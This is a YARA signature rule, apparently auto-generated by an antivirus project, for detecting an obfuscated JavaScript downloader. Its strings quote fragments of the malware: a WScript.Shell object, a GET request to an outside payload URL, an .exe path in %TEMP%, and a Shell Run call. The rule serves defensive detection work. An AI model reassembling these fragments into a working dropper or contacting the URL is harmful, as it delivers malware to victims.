rule sig_20160401_31c5d7a2e1683a0e4204695a3ec6fb5b {
  meta:
    description = "datamaliciousorder - file 20160401_31c5d7a2e1683a0e4204695a3ec6fb5b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1516525bb545a09f65c04f5ac18a1903f3efe2d1c358cf888db7464f0b18921b"

  strings:
    $s1  = "var BclMoy = function ZvhBlg() {return WScript[PwlZyr](\"WScript\"+\".Shell\");}(), FafEue = 11;" fullword ascii
    $s2  = "function UrcGtn(NvvOdf, AzQg){ZnuQj = ZnuQj * 1; return NvvOdf - AzQg;};" fullword ascii
    $s3  = "ArZjy[LpcBjr](\"G\" + \"ET\", \"http://ekotrade.linuxpl.info/b6dsa\", false);" fullword ascii
    $s4  = "if (ArZjy[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function JpnWq() {return BclMoy[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"qo7Ft9eZNp5j.ex\" + \"e\";};" fullword ascii
    $s6  = "function BrlUxc(){return YpdCo + \"\";};" fullword ascii
    $s7  = "function XeJwf() {return ((PndAjx == true) && (PndAjx == PlpExw)) ? 1 : ZnuQj;};" fullword ascii
    $s8  = "var YoMj = false;" fullword ascii
    $s9  = "PlpExw = true; " fullword ascii
    $s10 = "var VgLww = new this[\"Date\"]();" fullword ascii
    $s11 = "var PlpExw = false;" fullword ascii
    $s12 = "PndAjx = true; " fullword ascii
    $s13 = "return UrcGtn(MgaVnb, LczPs);" fullword ascii
    $s14 = "}while (JjLov);" fullword ascii
    $s15 = "function NoGbc()" fullword ascii
    $s16 = "function QwQf(VtmXw) {var TeOr = (1, 2, 3, 4, 5, VtmXw); return TeOr;};" fullword ascii
    $s17 = "function AdvNyc(NhSr){BclMoy[\"R\"+\"un\"](NhSr, ZnuQj, ZnuQj);};" fullword ascii
    $s18 = "function JyfKq(){return 23;};" fullword ascii
    $s19 = "function WmTd(){return PwlZyr;};" fullword ascii
    $s20 = "var PndAjx = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}